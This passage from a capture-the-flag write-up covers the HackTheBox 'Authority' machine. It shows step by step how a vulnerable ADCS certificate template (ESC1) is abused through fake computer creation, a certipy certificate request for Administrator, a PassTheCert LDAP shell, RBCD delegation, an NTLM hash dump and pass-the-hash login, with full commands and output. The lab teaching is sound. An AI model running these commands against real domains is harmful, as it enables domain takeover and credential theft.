+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+        Write Property Principals       : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+</span></code></pre></div></div>
+<p>At the bottom it identifies a template named <code class="language-plaintext highlighter-rouge">CorpVPN</code> that is vulnerable to <code class="language-plaintext highlighter-rouge">ESC1</code>. I’ll note the CA name of AUTHORITY-CA as well.</p>
+<h3 id="esc1">ESC1</h3>
+<h4 id="background">Background</h4>
+<p>Black Hills Information Security has a nice <a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">post on ESC1</a>. ESC1 is the vulnerability when the ADCS is configured to allow low privileged users to enroll and request a certificate on behalf of any domain object, including privileged ones.</p>
+<p>The example given in the post shows the settings that must be for this to work, and it matches what comes out of Authority, except for one difference:</p>
+<picture>
+<source srcset="/img/image-20231127135102471.webp" type="image/webp"/>
+<img alt="image-20231127135102471" class="include_image" loading="lazy" src="/img/image-20231127135102471.png"/>
+</picture>
+<p>In this case, it’s <code class="language-plaintext highlighter-rouge">Domain Computers</code> who can enroll with this template, not <code class="language-plaintext highlighter-rouge">Domain Users</code>.</p>
+<h4 id="create-computer-account">Create Computer Account</h4>
+<p>In <a href="/2022/12/17/htb-support.html#create-fakecomputer">Support</a> I had an exploitation path that required a fake computer. I’ll do the same thing here, though on Support I did it from a shell on the target, while here I’ll show how to do it remotely with <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>.</p>
+<p>The setting that allows a user to add a computer to the domain is the <code class="language-plaintext highlighter-rouge">ms-ds-machineaccountquota</code>. On Authority, I can query this with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">/opt/PowerSploit/Recon/PowerView.ps1</span><span class="w">
+</span><span class="go">Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\programdata\PowerView.ps1
+
+                                                             
+Data: 1027036 bytes of 1027036 bytes copied
+
+Info: Upload successful!
+
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerView.ps1</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="nx">Get-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'DC=AUTHORITY,DC=HTB'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">ms-ds-machineaccountquota</span><span class="w">
+</span><span class="go">
+ms-ds-machineaccountquota
+-------------------------
+                       10
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">netexec</code> will also do this from my VM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-M</span> MAQ
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">LDAPS </span><span class="go">      10.10.11.222    636    AUTHORITY        </span><span class="netexec-logsuccess">[+]</span><span class="go"> authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
+</span><span class="nb">MAQ </span><span class="go">        10.10.11.222    389    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Getting the MachineAccountQuota
+</span><span class="nb">MAQ </span><span class="go">        10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
+</span></code></pre></div></div>
+<p>Now I can add the computer with <code class="language-plaintext highlighter-rouge">addcomputer.py</code>:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>addcomputer.py <span class="s1">'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'</span> <span class="nt">-method</span> LDAPS <span class="nt">-computer-name</span> 0xdf <span class="nt">-computer-pass</span> 0xdf0xdf0xdf <span class="nt">-dc-ip</span> 10.10.11.222
+<span class="go">Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra
+
+[*] Successfully added machine account 0xdf$ with password 0xdf0xdf0xdf.
+</span></code></pre></div></div>
+<h4 id="create-certificate">Create Certificate</h4>
+<p>With the computer account on the domain, now <code class="language-plaintext highlighter-rouge">certipy</code> will create the certificate with the following options:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">req</code> - request a certificate</li>
+<li><code class="language-plaintext highlighter-rouge">-username '0xdf$' -password 0xdf0xdf0xdf</code> - auth as the computer account created above</li>
+<li><code class="language-plaintext highlighter-rouge">-ca AUTHORITY-CA</code> - the certificate authority associated with the ADCS</li>
+<li><code class="language-plaintext highlighter-rouge">-dc-ip 10.10.11.222</code> - the IP of the DC</li>
+<li><code class="language-plaintext highlighter-rouge">-template CorpVPN</code> - the name of the vulnerable template</li>
+<li><code class="language-plaintext highlighter-rouge">-upn administrator@authority.htb</code> - the user requesting the certificate for</li>
+<li><code class="language-plaintext highlighter-rouge">-dns authority.htb</code> - the DNS server to use in this request</li>
+</ul>
+<p>The result is a certificate plus private key saved in <code class="language-plaintext highlighter-rouge">administrator_authority.pfx</code>:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy req <span class="nt">-username</span> <span class="s1">'0xdf$'</span> <span class="nt">-password</span> 0xdf0xdf0xdf <span class="nt">-ca</span> AUTHORITY-CA <span class="nt">-dc-ip</span> 10.10.11.222 <span class="nt">-template</span> CorpVPN <span class="nt">-upn</span> administrator@authority.htb <span class="nt">-dns</span> authority.htb
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 3
+[*] Got certificate with multiple identifications
+    UPN: 'administrator@authority.htb'
+    DNS Host Name: 'authority.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator_authority.pfx'
+</span></code></pre></div></div>
+<h3 id="passthecert">PassTheCert</h3>
+<h4 id="auth-fail">Auth [Fail]</h4>
+<p>Typically at this point I would use the <code class="language-plaintext highlighter-rouge">auth</code> command to get the NTLM hash for the administrator user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy auth <span class="nt">-pfx</span> administrator_authority.pfx 
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Found multiple identifications in certificate
+[*] Please select one:
+    [0] UPN: 'administrator@authority.htb'
+    [1] DNS Host Name: 'authority.htb'
+&gt; 0
+[*] Using principal: administrator@authority.htb
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+</span></code></pre></div></div>
+<p>This happens “when a domain controller doesn’t have a certificate installed for smart cards”, according to <a href="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d">this post</a> from Specterops. Specifically, it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”.</p>
+<p>The same post suggests an alternative path:</p>
+<blockquote>
+<p>If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a>. You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.</p>
+</blockquote>
+<h4 id="ldap-shell-path-1">LDAP Shell [Path 1]</h4>
+<p>To perform a PassTheCert attack, I’ll need the key and certificate in separate files, which <code class="language-plaintext highlighter-rouge">certipy</code> can handle:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nocert</span> <span class="nt">-out</span> administrator.key
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Writing private key to 'administrator.key'
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nokey</span> <span class="nt">-out</span> administrator.crt
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Writing certificate and  to 'administrator.crt'
+</span></code></pre></div></div>
+<p><a href="https://github.com/AlmondOffSec/PassTheCert">This repo</a> has C# and Python tools to do a PassTheCert attack. It also offers an <code class="language-plaintext highlighter-rouge">ldap-shell</code> option that allows me to run a limited set of commands on the DC. I’ll clone it, and then run <code class="language-plaintext highlighter-rouge">passthecert.py</code> with the following options:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-action ldap-shell</code> - provide a limited set of commands</li>
+<li><code class="language-plaintext highlighter-rouge">-crt administrator.crt -key administrator.key</code> - the certificate and key files</li>
+<li><code class="language-plaintext highlighter-rouge">-domain authority.htb -dc-ip 10.10.11.222</code> - target info</li>
+</ul>
+<p>It connects:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python PassTheCert/Python/passthecert.py <span class="nt">-action</span> ldap-shell <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
+<span class="go">Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra
+
+Type help for list of commands
+
+</span><span class="gp">#</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll play around with the various commands:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"># </span><span class="nb">help</span>
+<span class="go">
+ add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
+ rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
+ add_user new_user [parent] - Creates a new user.
+ add_user_to_group user group - Adds a user to a group.
+ change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
+ clear_rbcd target - Clear the resource based constrained delegation configuration information.
+ disable_account user - Disable the user's account.
+ enable_account user - Enable the user's account.
+ dump - Dumps the domain.
+ search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
+ get_user_groups user - Retrieves all groups this user is a member of.
+ get_group_users group - Retrieves all members of a group.
+ get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
+ grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+ set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
+ set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
+ start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
+ write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
+ exit - Terminates this session.
+</span></code></pre></div></div>
+<p>The one that works is <code class="language-plaintext highlighter-rouge">add_user_to_group</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"># </span>add_user_to_group svc_ldap administrators
+<span class="go">Adding user: svc_ldap to group Administrators result: OK
+</span></code></pre></div></div>
+<p>I’ll reconnect with a new Evil-WinRM shell as svc_ldap, and now it has the administrators group:</p>
+<picture>
+<source srcset="/img/image-20231127142325929.webp" type="image/webp"/>
+<img alt="image-20231127142325929" class="include_image" loading="lazy" src="/img/image-20231127142325929.png"/>
+</picture>
+<p>That’s enough to read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w">
+</span><span class="go">367eb8b3************************
+</span></code></pre></div></div>
+<h4 id="passthecert---tgt-path-2">PassTheCert -&gt; TGT [Path 2]</h4>
+<p>The intended way to exploit this is to use the <code class="language-plaintext highlighter-rouge">write_rbcd</code> action to give the fake computer <code class="language-plaintext highlighter-rouge">0xdf$</code> delegration rights over the DC:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python PassTheCert/Python/passthecert.py <span class="nt">-action</span> write_rbcd <span class="nt">-delegate-to</span> <span class="s1">'AUTHORITY$'</span> <span class="nt">-delegate-from</span> <span class="s1">'0xdf$'</span> <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
+<span class="go">Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] 0xdf$ can now impersonate users on AUTHORITY$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     0xdf$        (S-1-5-21-622327497-3269355298-2248959698-11602)
+</span></code></pre></div></div>
+<p>I’ll make sure my clock is in sync with Authority:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>ntpdate 10.10.11.222
+<span class="go">27 Nov 18:28:15 ntpdate[588490]: step time server 10.10.11.222 offset -14216.802932 sec
+</span></code></pre></div></div>
+<p>And get a Silver Ticket:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getST.py <span class="nt">-spn</span> <span class="s1">'cifs/AUTHORITY.AUTHORITY.HTB'</span> <span class="nt">-impersonate</span> Administrator <span class="s1">'authority.htb/0xdf$:0xdf0xdf0xdf'</span>
+<span class="go">Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+</span></code></pre></div></div>
+<p>With this, I can dump the NTLM hashes from the DC:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache secretsdump.py <span class="nt">-k</span> <span class="nt">-no-pass</span> authority.htb/administrator@authority.authority.htb <span class="nt">-just-dc-ntlm</span>
+<span class="go">Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:40411717d1f7710c4ba1e3f5e1906d90:::
+0xdf$:11602:aad3b435b51404eeaad3b435b51404ee:81cebe41108f5b1c36f3dd3c01dccfc3:::
+[*] Cleaning up... 
+</span></code></pre></div></div>
+<p>That hash works over Evil-WinRM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> authority.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> 6961f422924da90a6928197429eea4ed
+<span class="go">
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/12/09/htb-authority.html"></a>
+</article>
